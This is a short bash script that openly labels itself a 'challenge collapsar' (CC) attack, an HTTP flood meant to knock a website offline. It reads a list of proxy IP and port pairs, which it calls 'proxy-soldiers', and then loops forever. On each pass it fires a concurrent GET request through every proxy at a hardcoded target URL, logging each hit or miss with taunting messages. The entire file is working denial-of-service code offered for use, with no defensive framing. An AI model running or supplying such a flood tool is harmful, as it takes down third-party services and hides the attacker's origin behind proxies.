#!/bin/bash
 
declare target_url="http://eecs.cc:8080/"
declare get_timeout_sec=5
declare line
declare times
declare ip
declare port
declare i
declare j
 
function quit() {
    exit "$1"
}
 
#retarget the input file to stdin
if ! [ "$#" -gt "0" ]
then
    exec 1>&2
    echo "challenge collapsar attack -- cc attack"
    echo "usage: bash $0 proxyListFile.txt"
    echo "error: must have one input arg"
    quit 1
fi
 
echo "report : total `cat $1 | wc -l` proxy-soldiers are ready for command"
echo "command: target: $target_url"
echo "command: start challenge collapsar attack   :)   amazing..."
 
exec 0<$1
#start challenge collapsar attack
 
while true
do
    times=0
    exec 0<&-
    exec 0<$1
    while read line
    do
        times=$((times+1))
        j=0
        for i in `echo $line | tr ' ' '\n' | grep -E '^[^\s].*$'`
        do
            j=$((j+1))
            if [ "$j" -eq 1 ]
            then
                ip=$i
            else
                port=$i
            fi
        done
        echo "times=$times ip=$ip port=$port"
        #single soldier attack
        if GET -t "$get_timeout_sec" -p "http://$ip:$port" "$target_url" &>/dev/null
        then
            echo "soldier$times attack $target_url :)"
        else
            echo "soldier$times attack $target_url miss"
        fi &
    done
    wait
done
 
#close the fd of input file
exec 0>&-
quit 0
#exit
